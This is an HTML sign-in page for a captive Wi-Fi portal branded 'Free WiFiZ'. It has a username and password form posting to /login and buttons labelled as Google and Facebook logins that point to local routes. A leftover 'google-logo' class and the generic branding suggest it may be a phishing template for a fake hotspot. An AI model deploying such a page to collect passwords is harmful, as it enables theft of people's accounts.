<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <!-- <meta name="viewport" content="width=device-width, initial-scale=1.0"> -->
    <title>Sign In | Free WiFiZ </title>
    <link rel="stylesheet" href="/static/style.css">
</head>
<body>
    <table align="center" width="100%">
    <tr>
    <td>

    <form id="login_form" method="POST" action="/login">
        <div class="login-box">
            <div class="google-logo" width="74" height="24">
                <img src="/static/freewifiz.png">
            </div>
            <div class="login-header">
                <header>Access the Internet</header>
                <p>Use your Free WiFiZ account</p>
            </div>
            <div class="input-box">
                <input type="text" class="input-field" id="login" name="login" autocomplete="off" required>
                <label for="login">Username</label>
            </div>
            <div class="input-box">
                <input type="password" class="input-field" id="password" name="password" autocomplete="off" required>
                <label for="password">Password</label>
            </div>
            <div class="input-box">
                    <input type="submit" style="margin-top: 40px;" class="input-submit" value="Submit">
            </div>
        </div>
    </form>
    </td>
    </tr>
    <tr>
    <td>
		<div class="input-box" style="display: flex;">
            <input type="submit" style="margin-top: 10px;margin-right: 5px;background: #1a73e8;" class="input-submit" value="Log in with Google" onclick="window.location.href = '/google'">
			<input type="submit" style="margin-top: 10px;margin-left: 5px;background: #4267B2;" class="input-submit" value="Log in with Facebook" onclick="window.location.href = '/facebook'">
        </div>
		
    </div>
    </td>
    </tr>
    </table>
	<script src="/static/javascript.js"></script>
</body>
</html>
